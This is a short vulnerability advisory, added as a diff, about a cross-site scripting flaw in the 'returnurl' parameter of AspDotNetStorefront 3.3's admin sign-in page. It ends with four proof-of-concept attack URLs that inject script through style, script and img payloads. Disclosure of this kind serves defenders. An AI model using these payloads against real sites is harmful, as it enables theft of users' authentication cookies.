@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/10507/info
+
+AspDotNetStorefront is prone to a cross-site scripting vulnerability. This issue exists due to insufficient sanitization of user-supplied data. The problem presents itself in the 'returnurl' parameter of the 'signin.aspx' script of the application and can allow remote attackers to steal cookie-based authentication credentials and carry out other attacks.
+
+AspDotNetStorefront 3.3 is reportedly affected by this issue, however, it is possible that other versions are affected as well.
+
+http://www.example.com/aspdotnetcart/admin/signin.aspx?returnurl=1"style=
+"background:url(javascript:alert('Vulnerable_To_XSS'))"%20"
+
+http://www.example.com/aspdotnetcart/admin/signin.aspx?returnurl=--><scri
+pt>alert('Vulnerable_To_XSS')</script>
+
+http://www.example.com/aspdotnetcart/admin/signin.aspx?returnurl=>"><scri
+pt>alert("Vulnerable_To_XSS")</script>
+
+http://www.example.com/aspdotnetcart/admin/signin.aspx?returnurl=>"'><img
+%20src="javascript:alert('Vulnerable_To_XSS')">
